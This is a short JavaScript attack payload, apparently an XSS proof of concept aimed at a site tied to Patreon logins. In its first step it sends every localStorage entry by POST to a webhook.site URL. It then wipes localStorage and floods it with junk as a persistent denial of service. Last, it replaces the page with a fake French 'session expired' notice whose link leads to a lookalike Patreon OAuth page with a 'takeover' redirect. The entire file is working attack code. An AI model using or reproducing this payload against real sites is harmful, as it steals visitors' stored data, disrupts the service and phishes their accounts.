// Full chain: exfiltrate + DoS + phishing
var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';

// Step 1: Exfiltrate localStorage
var d = JSON.stringify(localStorage);
fetch(w, {method:'POST', mode:'no-cors', body:d});

// Step 2: Clear + saturate localStorage (persistent DoS)
localStorage.clear();
for (var i = 0; i < 1e4; i++) {
  try { localStorage.setItem('d' + i, 'x'.repeat(500)); } catch(e) { break; }
}

// Step 3: Phishing page (fake "Session expired")
setTimeout(function() {
  document.body.textContent = '';
  document.body.setAttribute('style', 'background:#0d1117');
  var d = document.createElement('div');
  d.setAttribute('style', 'text-align:center;padding:60px;font-family:sans-serif;color:white');
  var h = document.createElement('h2');
  h.textContent = 'Session expiree';
  var p = document.createElement('p');
  p.textContent = 'Votre session Patreon a expire. Reconnectez-vous pour continuer.';
  p.setAttribute('style', 'margin:12px 0;color:#aaa');
  var a = document.createElement('a');
  a.href = 'https://patreon-oauth-korben.korben.workers.dev?redirect_uri=https://korben-takeover.vercel.app';
  a.setAttribute('style', 'padding:14px 28px;background:#e85b46;color:white;border-radius:8px;text-decoration:none;display:inline-block;margin:24px;font-size:16px;font-weight:bold');
  a.textContent = 'Reconnexion Patreon';
  d.appendChild(h);
  d.appendChild(p);
  d.appendChild(a);
  document.body.appendChild(d);
}, 500);
